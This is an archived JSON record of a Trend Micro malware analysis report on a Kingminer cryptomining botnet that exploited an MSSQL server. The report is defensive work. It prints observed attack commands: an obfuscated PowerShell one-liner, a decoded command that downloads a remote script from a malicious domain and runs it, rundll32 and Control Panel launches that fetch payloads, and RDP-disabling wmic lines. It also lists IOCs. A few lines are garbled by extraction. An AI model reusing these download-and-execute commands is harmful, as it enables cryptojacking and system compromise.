{
    "id": "6fb8e4f7-0b53-4c03-b686-33c478e24f7e",
    "created_at": "2023-01-12T15:05:16.890116Z",
    "updated_at": "2025-03-27T02:05:24.861599Z",
    "deleted_at": null,
    "sha1_hash": "bbca8aa880044e83c6c4812a579ae2bc0ec1824a",
    "title": "2022-05-18 - Uncovering a Kingminer Botnet Attack Using Trend Micro Managed XDR",
    "authors": "",
    "file_creation_date": "2022-05-25T20:35:00Z",
    "file_modification_date": "2022-05-25T20:35:00Z",
    "file_size": 1296082,
    "plain_text": "# Uncovering a Kingminer Botnet Attack Using Trend Micro™ Managed XDR\n\n**[trendmicro.com/en_us/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-x.html](https://www.trendmicro.com/en_us/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-x.html)**\n\nMay 18, 2022\n\nTrend Micro’s Managed XDR team addressed a Kingminer botnet attack conducted through an SQL exploit. We discuss our findings and\nanalysis in this report.\n\nBy: Buddy Tancio, Jed Valderama May 18, 2022 Read time: 4 min (1083 words)\n\nWe observed malicious activities in a client’s SQL server that flagged a potential exploit in one public-facing device. A quick look at the Trend\n[Micro Vision One™ Workbench showed that a Microsoft SQL server process created an obfuscated PowerShell command. This suggested that](https://www.trendmicro.com/vinfo/ph/security/news/cybercrime-and-digital-threats/tracking-detecting-and-thwarting-powershell-based-malware-and-attacks)\nthe machine had been compromised, prompting us to investigate further.\n\nThe tactics, techniques, and procedures (TTPs) discussed here reflect many of the TTPs that threat researchers have identified with the\n[Kingminer botnet. According to reports in mid-2020, malicious actors deployed Kingminer to target SQL servers for cryptocurrency mining.](https://www.bankinfosecurity.com/kingminer-botnet-targeting-sql-servers-for-cryptomining-a-14412)\n[Threat analysts have also documented known activities of the Kingminer botnet operators in November 2018 and their reemergence in July](https://www.zdnet.com/article/kingminer-cryptojacker-returns-now-new-and-improved/)\n2019. Our recent detections therefore suggest the apparent resurgence of the malware that exploits systems with known, unpatched\nvulnerabilities. We discuss our findings in the following section.\n\nFigure 1. Trend Micro Vision One Workbench detection for the malicious SQL activity\n\n**Investigation and analysis**\n\n[We observed a VBScript file named %PUBLIC%\\gfghhjhyuq.vbs executed through sqlservr.exe. This led us to suspect that the device had been](https://www.techopedia.com/definition/22809/visual-basic-script-vbscript)\nexploited through a vulnerability that allowed malicious actors to execute arbitrary codes remotely. The sqlservr process handles the requests\nreceived by an MSSQL database\n\n\n-----\n\nFigure 2. Trend Micro Vision One™ execution profile of sqlservr.exe using PowerShell to run gfghhjhyuq.vbs\n\nWe collected the gfghhjhyuq.vbs file using Trend Micro Vision One to probe further. Despite the script being obfuscated, we were able to\nuncover most of its functions by decoding the hex string parameters. We describe the chain of events in the following section.\n\n[The file first checks for the operating system version through a WMI object. It then proceeds to download a 32-bit or 64-bit payload depending](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)\non the installed Windows version.\n\nFigure 3. Partially decoded gfghhjhyuq.vbs used to check the operating system version\n\nthrough a WMI object\n\nNext, it downloads a standalone PowerShell binary from a raw file stored in a GitHub user’s repository. Afterward, it saves and executes it as\n%PUBLIC%\\{timestamp}\\sysdo.exe.\n\nFi D l di f bit 6 bit P Sh ll bi f GitH b it\n\n\n-----\n\nFigure 5. PowerShell binary copied as sysdo.exe and executed\n\nFollowing this, it generates the URL where additional PowerShell scripts will be downloaded. The scripts are then executed filelessly using\n[Invoke-Expression.](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2)\n\nFigure 6. Generating URLs for download and fileless execution of additional PowerShell scripts\n\nFinally, it runs a cryptocurrency miner payload through a Control Panel item.\n\nFigure 7. Execution of cryptocurrency miner through a Control Panel item\n\nSecurity teams can clearly see and monitor the chain of events in Vision One. After the cryptocurrency miner is executed through the Control\nPanel item, sqlservr.exe calls C:\\Windows\\Temp\\sysdo.exe (renamed as PowerShell binary).\n\nFigure 8. Sysdo.exe (renamed as a PowerShell binary) executing the following obfuscated commands directly to memory,\n\ndetected as Trojan.PS1.MALXMR.PFAIS\n\n_\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c_\n_\"$p='b3f8b7aab7d9f2e0bad8f5fdf2f4e3b7bad4f8fad8f5fdf2f4e3b7dae4effafba5b9cfdadbdfc3c3c7acb3f8b9d8e7f2f9bfb0d0d2c3b0bbb0ffe3e3e7adb8b8e0e0b_\n_= for($i=0; $i -lt $p.length; $i+=2){[char](([byte][char][int]::Parse($p.substring($i,2),'HexNumber')) -bxor 151)};$p=(-join $p) -join ' ';$p|&(GAL_\n_I*X)\"_\n\nUpon checking the Windows Antimalware Scan Interface (AMSI) telemetry through Vision One, we saw the decoded PowerShell command\nlines. These connect to http://ww[.]3113cfdae.com/eb[.]txt th\n\n_$o = New-Object -ComObject Msxml2.XMLHTTP;$o.Open('GET','http://ww.3113cfdae.com/eb.txt', $False);$o.Send();$p_\n\n_=$o.responseText;[System.Text.Encoding]::Ascii.GetString([Convert]::FromBase64String($p))|&(GAL I*X);nei -PEP_\n\n_ath ffff -nic tk_\n\n\n-----\n\nS a to w at we saw ou a a ys s o t e e g g j yuq.vbs sc pt, t as a so bee obse ved t oug V s o O e t at sysdo.e e vo ed\n[rundll32 using a main.cpl, which is a Microsoft Module for the functionality of the mouse. The malicious actor used this module to launch the](https://answers.microsoft.com/en-us/windows/forum/all/what-is-rundll32exe/5f707fc5-d78b-4cdd-a5d0-bb0c4b80c3a8)\npayload directly onto the device’s memory that connects to known malicious domain, http://qqqe[.]1eaba4fdae[.]com, to download additional\ncomponents.\n\n_\"C:\\Windows\\System32\\control.exe\" \"C:\\Windows\\system32\\main.cpl\" -QmDvMERT99 http://qqqe.1eaba4fdae.com/ -ming day2 -PRHVoCqZ99_\n\n_\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\system32\\main.cpl\" -QmDvMERT99 http://qqqe.1eaba4fdae.com/ -_\n_ming day2 -PRHVoCqZ99I*X)\"_\n\nFigure 9. Process tree of Control Panel item execution as seen in the Vision One console\n\nWe noticed additional PowerShell executions spawned by sqlservr.exe. These were executed by the previously dropped sysdo.exe file. There are\ntwo commands here: One checks if the installed version of Windows is from Windows 2000 to Windows 7. Secondly, it checks separately if\n[hotfixes KB4499175 (Windows 7 SP1) and KB4500331 (Windows XP, Windows Server 2003 SP2) are installed. If it finds that none of the](https://trendmicro-my.sharepoint.com/personal/louiseabigail_payuyo_trendmicro_com/Documents/Desktop/1KingMiner/Capitalize%20KB,%20link%20here:%20https:/support.microsoft.com/en-us/topic/may-14-2019-kb4499175-security-only-update-4633b67f-f683-7731-f332-e1e7ec35bfc5)\n[hotfixes is present, this means that it is vulnerable to the BlueKeep vulnerability assigned as CVE-2019-0708. If both commands yield negative](https://nvd.nist.gov/vuln/detail/cve-2019-0708)\nresults, the script disables RDP and the cryptocurrency miner proceeds to its infection routine.\n\n_\"C:\\Windows\\system32\\cmd.exe\" /c cmd /c ver |findstr \"5.0 5.1 5.2 6.0 6.1\"&&wmic qfe GET hotfixid |findstr /i \"kb4499175 kb4500331\"||wmic_\n_RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0_\n\n_\"C:\\Windows\\System32\\cmd.exe\" /c ver |findstr \"5.0 5.1 5.2 6.0 6.1\"&&wmic qfe GET hotfixid |findstr /i \"kb4499175 kb4500331\"||wmic RDTOGGLE_\n_WHERE ServerName='HELPDESK' call SetAllowTSConnections 0_\n\n**Discovering vulnerabilities**\n\nUsing a search engine for internet of things (IoT) devices like Shodan and Censys, the team was able to both see exposed services such as RDP\nand SQL and validate missing patches on any machine. One of the vulnerabilities we found traces back to 2014.\n\nFigure 10. Vulnerability found through a Shodan scan on any public-facing machine\n\nNotably, after we detected fgfghhjhyuq.vbs (detected as Trojan.VBS.MALXMR.AS), we continued to observe more attempts to drop malware\non the same server. It’s important to note that although the malicious actor was unable to execute the malware, such attempts did not stop\nsince the vulnerability was still there. Only after the vulnerability was patched did the attempts cease.\n\n**Conclusion and security recommendations**\n\n\n-----\n\nW e easu es o s g atu e detect o a e p ace to s e d a o ga at o s etwo o b eac es, secu ty tea s s ou d st p o t e t e\nidentification of vulnerabilities on their servers and endpoints and make sure that these are immediately patched. Doing so is even more crucial\nfor public-facing systems. Adopting a proactive cybersecurity mindset is essential for an organization to thrive as the conduct of business in the\ndigital space deepens and grows.\n\n[It is recommended that organizations deploy intrusion detection systems such as Trend Micro™ Deep Discovery™ Inspector) as a preventive](https://www.trendmicro.com/en_us/business/products/network/advanced-threat-protection/inspector.html)\nmeasure. This is relevant to the case discussed here. Since we did not have network-level visibility, we only relied on endpoint-level data to\ninvestigate and respond to the threat. Implementing network monitoring allows security professionals to detect specific server-related\nvulnerabilities that the malicious actors might abuse, in addition to being able to scope out all affected machines on the network. A reliable\nintrusion detection system would also be a useful tool for monitoring and investigating ongoing attacks since it can provide historical logs of\nactivities in an organization’s network.\n\n**Indicators of compromise (IOCs)**\n\n**SHA256** **Detection Name**\n\n0CF6882D750EEA945A9B239DFEAC39F65EFD91B3D0811159707F1CEC6CD80CC0 Trojan.VBS.MALXMR.AS\n\nCB29887A45AEA646D08FA16B67A24848D8811A5F2A18426C77BEAAE9A0B14B86 Trojan.PS1.MALXMR.PFAIS\n\nhxxp://ww.3113cfdae.com/eb[.]txt, detected as Dangerous (Disease Vector)\nhxxp://qqqe.1eaba4fdae[.]com/, detected as Dangerous (Disease Vector)\n\n## Recommended for you\n\nransomware\n\n|SHA256|Detection Name|\n|---|---|\n|0CF6882D750EEA945A9B239DFEAC39F65EFD91B3D0811159707F1CEC6CD80CC0|Trojan.VBS.MALXMR.AS|\n|CB29887A45AEA646D08FA16B67A24848D8811A5F2A18426C77BEAAE9A0B14B86|Trojan.PS1.MALXMR.PFAIS|\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-18 - Uncovering a Kingminer Botnet Attack Using Trend Micro Managed XDR.pdf"
    ],
    "report_names": [
        "2022-05-18 - Uncovering a Kingminer Botnet Attack Using Trend Micro Managed XDR.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535916,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653510900,
    "ts_modification_date": 1653510900,
    "files": {
        "pdf": "https://archive.orkl.eu/bbca8aa880044e83c6c4812a579ae2bc0ec1824a.pdf",
        "text": "https://archive.orkl.eu/bbca8aa880044e83c6c4812a579ae2bc0ec1824a.txt",
        "img": "https://archive.orkl.eu/bbca8aa880044e83c6c4812a579ae2bc0ec1824a.jpg"
    }
}